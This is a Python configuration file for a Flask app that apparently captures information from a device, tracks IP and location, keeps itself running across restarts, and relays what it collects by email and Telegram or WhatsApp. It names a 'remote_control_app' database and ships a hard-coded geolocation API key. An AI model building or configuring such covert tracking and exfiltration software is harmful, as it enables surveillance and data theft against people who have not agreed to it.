# config.py

import os

# General settings
APP_NAME = "Flask App"
DEBUG = False  # Set to False in production

# Server settings
SERVER_HOST = "0.0.0.0"  # Host for Flask (accessible from any IP)
SERVER_PORT = 5000       # Port for Flask

# Email settings for sending captured information
EMAIL_HOST = "smtp.gmail.com"   # Change to your email provider (e.g., smtp.mailtrap.io for testing)
EMAIL_PORT = 587                # Port for Gmail TLS
EMAIL_USER = os.getenv("EMAIL_USER", "")  # Email address (use env var for security)
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "")  # App password or actual password (env var)

# WhatsApp and Telegram API settings for messaging
WHATSAPP_API_KEY = os.getenv("WHATSAPP_API_KEY", "your-whatsapp-api-key")  # WhatsApp API key (use environment variable)
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "your-telegram-bot-token")  # Telegram Bot Token
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "your-telegram-chat-id")  # Your Telegram chat ID (get it from Telegram)

# Location and IP tracking settings
IP_API_URL = "https://ipinfo.io/json"  # External API for IP and location info (can use other services like ipstack)
GEO_API_KEY = os.getenv("GEO_API_KEY", "664aa98b8671029c1d0eb7e31fd7c3f327939237")  # Optional: For more detailed geo-location data

# Database settings (if using SQLite for example)
DATABASE_URI = os.getenv("DATABASE_URI", "sqlite:///remote_control_app.db")  # SQLite path or URI for your DB

# Persistence settings to keep the app running on the device (e.g., if it’s a long-running process)
PERSISTENCE_INTERVAL = 60  # Interval (in seconds) to check for persistent connection status

# Admin settings for the system (could be used to store backup information)
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL", "")  # Admin email for alerts
ADMIN_PHONE = os.getenv("ADMIN_PHONE", "+1234567890")  # Admin phone number for SMS alerts or notifications

# Paths and directories (for saving logs, backups, etc.)
LOG_DIRECTORY = os.getenv("LOG_DIRECTORY", "./logs")  # Directory to store logs
BACKUP_DIRECTORY = os.getenv("BACKUP_DIRECTORY", "./backups")  # Directory to store backups (if applicable)

# Filepaths for reporting, you may want to generate reports of tracking activity
REPORTS_DIRECTORY = os.getenv("REPORTS_DIRECTORY", "./reports")  # Directory for storing reports

# App persistence (to ensure the app restarts if the device restarts)
PERSISTENT_FILE = os.getenv("PERSISTENT_FILE", "./persistent_state.txt")  # File that keeps track of persistence

# Encryption settings (if the app encrypts sensitive data)
ENCRYPTION_KEY = os.getenv("ENCRYPTION_KEY", "your-encryption-key")  # Key for data encryption
ENCRYPTION_ALGORITHM = "AES"  # Example: AES encryption algorithm

# Optional: Custom port for other services (e.g., a second API or WebSocket service)
SECONDARY_SERVER_PORT = 6000  # Custom port for secondary service if needed

